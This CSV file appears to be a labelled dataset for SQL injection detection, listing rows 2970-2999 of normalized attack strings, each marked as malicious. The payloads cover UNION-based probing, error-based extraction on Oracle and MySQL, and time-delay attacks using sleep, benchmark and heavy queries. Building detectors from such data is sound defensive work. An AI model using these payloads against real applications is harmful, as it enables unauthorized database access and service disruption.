row_index,payload_norm,label,sqli_type_hint
2970,1 ) as nsdy where 7513 = 7513,1,
2971,"-9337 ) union all select 5648,5648,5648,5648,5648#",1,
2972,"-2734' ) union all select 5510,5510,5510,5510,5510#",1,
2973,"1"" ) as vcir where 6275 = 6275 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,
2974,"-7559"" or 8792 = 6905--",1,
2975,"1' and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and 'zetf' = 'zetf",1,
2976,"iif ( 8354 = 3515,1,1/0 )",1,
2977,"-2612"" ) as iwfj where 3231 = 3231 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --",1,
2978,"1' ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( 'ygfv' = 'ygfv",1,
2979,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( '%' = '",1,
2980,"-7945%' ) ) ) union all select 4286,4286,4286,4286,4286,4286--",1,
2981,"-5998%"" ) union all select 2366,2366,2366,2366#",1,
2982,"1'|| ( select 'wqmz' where 6400 = 6400 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) ) ||'",1,
2983,"1, ( select * from generate_series ( 5609,5609,case when ( 5609 = 5609 ) then 1 else 0 end ) limit 1 )",1,
2984,"-6129 union all select 9122,9122#",1,
2985,"1' ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 'qfvg' = 'qfvg",1,
2986,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ""swec"" like ""swec",1,
2987,"1"" ) ) rlike sleep ( 5 ) and ( ( ""ahhx"" like ""ahhx",1,
2988,"1 ) where 7600 = 7600 union all select null,null,null,null,null,null--",1,
2989,"1' in boolean mode ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) #",1,
2990,1%' ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,1,
2991,"-5945' ) ) ) union all select 4266,4266,4266,4266,4266--",1,
2992,"1 where 2674 = 2674 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
2993,"1"" ) as rcnk where 1800 = 1800",1,
2994,"-2701"" ) ) as wvht where 5401 = 5401 union all select 5401,5401,5401,5401,5401,5401,5401,5401#",1,
2995,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ""vcvb"" like ""vcvb",1,
2996,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( 8503 = 8503",1,
2997,"-9688%' ) ) ) or elt ( 3695 = 7995,7995 ) and ( ( ( '%' = '",1,
2998,"1 ) ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ( 8671 = 8671",1,
2999,1 ) ) as ewlg where 3722 = 3722 rlike sleep ( 5 ) --,1,
